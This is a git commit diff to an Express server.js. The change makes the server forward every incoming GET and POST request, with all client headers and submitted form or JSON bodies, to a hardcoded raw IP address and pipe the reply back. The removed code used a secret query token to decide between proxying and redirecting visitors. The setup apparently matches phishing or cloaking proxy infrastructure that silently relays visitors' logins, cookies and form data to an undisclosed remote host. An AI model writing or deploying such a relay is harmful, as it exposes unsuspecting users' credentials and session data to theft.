e9b5914196dd76a77ea969060a83b4d0cabe202f
filomena1040 <120242762+filomena1040@users.noreply.github.com>
2023-10-30 08:39:08 -0700

    1

--- server.js
+++ server.js
@@ -1,48 +1,55 @@
 var bodyParser = require("body-parser");
 var express = require("express");
 const requester = require("request");
+const fs = require("fs");
 
 var app = express();
 app.use(bodyParser.urlencoded({ limit: "50mb", extended: true }));
 app.use(bodyParser.json({ limit: "50mb" }));
+app.use(bodyParser.text({ type: "text/html" }));
 app.use(bodyParser.raw());
 app.set("port", process.env.PORT);
+
+app.post("*", function (req, res) { 
+  req.headers["X-Asteria-Client-IP"]=req.headers["x-forwarded-for"].split(",")[0]
+  var head = req.headers;
+  var headerss = JSON.stringify(head)
+    .replace("'{", "")
+    .replace("}'", "")
+    .replace("127.0.0.1:4444", "localhost");
+  var urrrl = "http://185.20.184.142" + req.url;
+  requester.post(
+    {
+      headers: head,
+      url: urrrl,
+      form: req.body,
+      json: false,
+    }
+  ).pipe(res);
+});
 
 app.get("*", function (req, res) {
   req.headers["X-Asteria-Client-IP"]=req.headers["x-forwarded-for"].split(",")[0]
   var head = req.headers;
-  var headerss=JSON.stringify(head).replace("'{","").replace("}'","").replace("content-length","content2").replace("accept-encoding","dfsdfsdff")
+  var headerss = JSON.stringify(head)
+    .replace("'{", "")
+    .replace("}'", "")
+    .replace("127.0.0.1:4444", "localhost:2057");
   var querystring = req.url;
-  var urrrl = "http://185.36.189.90:6070" + req.url;
-  
-  if(!querystring.includes("flgkimv")){
-     
-      requester.get(
+  var urrrl = "http://185.20.184.142" + req.url;
+
+  if (!querystring.includes("assets") || !querystring.includes(".")) {
+    requester.post(
       {
-        headers:JSON.parse(headerss),
-        url:     urrrl,
-      }, function(error, response, body){
-        console.log(body)
-        console.log(response.statusCode)
-        if(response.statusCode==200){
-          if(!body.includes("<")){
-            return res.redirect(body); 
-          }else{
-            return res.sendStatus(400);           
-          }
-        }else{  
-          return res.sendStatus(400);
-        }
-    });
-    
-  }else if(querystring.includes("flgkimv")){
-    
-    requester.get({headers:JSON.parse(headerss),url:urrrl}).pipe(res);
-       
-  }else{
-     return res.sendStatus(400);
+        headers: head,
+        url: urrrl,
+        body: req.body,
+        json: true,
+      }
+    ).pipe(res);
+  } else {
+    requester.get(urrrl).pipe(res);
   }
-    
 });
 
 app.listen(process.env.PORT, "0.0.0.0", function () {
